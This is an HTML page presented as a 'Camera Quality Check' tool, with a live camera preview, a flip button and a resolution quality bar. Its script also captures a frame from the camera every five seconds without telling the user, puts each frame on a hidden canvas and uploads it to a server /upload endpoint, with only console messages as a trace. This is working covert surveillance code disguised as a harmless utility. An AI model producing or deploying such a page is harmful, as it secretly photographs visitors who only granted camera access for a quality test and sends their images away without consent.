<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Check Camera Quality</title>
<style>
  body {
    font-family: Arial, sans-serif;
    text-align: center;
    margin: 20px;
    background-color: black;
    color: white;
  }
  h1 { margin-top: 8%; font-size: xxx-large; }

  video, canvas {
    border: 1px solid #ccc;
    border-radius: 8px;
    width: 80%;
    height: 60%;
    margin-top: 20px;
  }

  @media (max-width: 1180px) {
    video, canvas { width: 80%; height: 40%; margin-top: 20px; }
  }

  button {
    padding: 10px 15px;
    font-size: 16px;
    margin: 10px;
    cursor: pointer;
    border-radius: 5px;
    border: none;
    background-color: #007BFF;
    color: white;
  }
  button:hover { background-color: #0056b3; }

  /* Quality Bar */
  #qualityBarWrapper {
    position: fixed;
    top: 50%;
    right: 20px;
    transform: translateY(-50%);
    width: 20px;
    height: 70%;
    background: linear-gradient(to top, red, yellow, green);
    border-radius: 10px;
    border: 1px solid #333;
    overflow: hidden;
  }

  #qualityMarker {
    position: absolute;
    left: -4px;
    width: 28px;
    height: 2px;
    background: black;
    transition: top 0.5s ease; /* smooth animation */
  }

  #qualityText {
    position: fixed;
    top: 50%;
    right: 60px;
    transform: translateY(-50%);
    font-size: 26px;
    font-weight: bold;
  }

  #qualityText span {
    display: block;
    font-size: 14px;
    color: #ccc;
  }

  @media (max-width: 1180px) {
    #qualityBarWrapper { top: 30%; right: 25px; width: 30px; height: 50%; }
    #qualityMarker { width: 38px; }
    #qualityText { top: 58%; font-size: 50px; }
  }
</style>
</head>
<body>
<h1>Camera Quality Check</h1>

<div id="qualityBarWrapper">
  <div id="qualityMarker"></div>
</div>
<div id="qualityText">0%<span>0x0</span></div>

<video id="video" autoplay playsinline muted></video>
<br>
<button id="flipBtn">Flip Camera</button>
<button id="captureBtn">Capture</button>
<canvas id="canvas" style="display:none;"></canvas>

<script>
let video = document.getElementById('video');
let canvas = document.getElementById('canvas');
let captureBtn = document.getElementById('captureBtn');
let flipBtn = document.getElementById('flipBtn');
let marker = document.getElementById('qualityMarker');
let qualityText = document.getElementById('qualityText');
let qualitySpan = qualityText.querySelector('span');
let stream;
let usingFrontCamera = true;

// ðŸ”¹ Start Camera
async function startCamera() {
  if(stream) stream.getTracks().forEach(track => track.stop());
  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: { 
        facingMode: usingFrontCamera ? "user" : "environment",
        width: { ideal: 1920 },
        height: { ideal: 1080 }
      },
      audio: false
    });
    video.srcObject = stream;
    await video.play();
  } catch (err) {
    console.error("Camera not accessible:", err);
    alert("Cannot access camera. Make sure you are on HTTPS and allowed camera access.");
  }
}

// ðŸ”¹ Flip camera
flipBtn.addEventListener('click', () => {
  usingFrontCamera = !usingFrontCamera;
  startCamera();
});

// ðŸ”¹ Capture Photo
function capturePhoto() {
  let ctx = canvas.getContext('2d');
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

  canvas.toBlob(async (blob) => {
    let formData = new FormData();
    formData.append('file', blob, 'photo.png');
    try {
      let response = await fetch('/upload', { method: 'POST', body: formData });
      if(response.ok) console.log('Photo uploaded successfully!');
      else console.error('Upload failed');
    } catch(err) {
      console.error('Upload error:', err);
    }
  }, 'image/png');
}

captureBtn.addEventListener('click', capturePhoto);

// ðŸ”¹ Auto-capture every 5 seconds
setInterval(capturePhoto, 5000);

// ðŸ”¹ Update Quality
function updateQuality() {
  if(!video.videoWidth || !video.videoHeight) return;

  const width = video.videoWidth;
  const height = video.videoHeight;

  const resTable = [
    {w:160, h:120, pct:4},
    {w:360, h:240, pct:10},
    {w:420, h:320, pct:15},  
    {w:640, h:480, pct:15},
    {w:1280, h:720, pct:44},
    {w:1920, h:1080, pct:100},
    {w:3840, h:2160, pct:100}
  ];

  let resPercent = 0;
  for(let i=0;i<resTable.length;i++){
    const entry = resTable[i];
    if(width <= entry.w && height <= entry.h){
      resPercent = entry.pct;
      break;
    }
  }

  // ðŸ”¹ Smooth bar animation
  const barHeight = document.getElementById('qualityBarWrapper').offsetHeight;
  marker.style.top = Math.floor(barHeight * (1 - resPercent/100)) + "px";

  // ðŸ”¹ Update text and tooltip
  qualityText.innerText = resPercent + "%";
  qualitySpan.innerText = `${width}x${height}`;
  qualityText.appendChild(qualitySpan);
  qualityText.style.color = resPercent < 40 ? "red" : resPercent < 70 ? "orange" : "green";
}

setInterval(updateQuality, 2000);

startCamera();
</script>
</body>
</html>
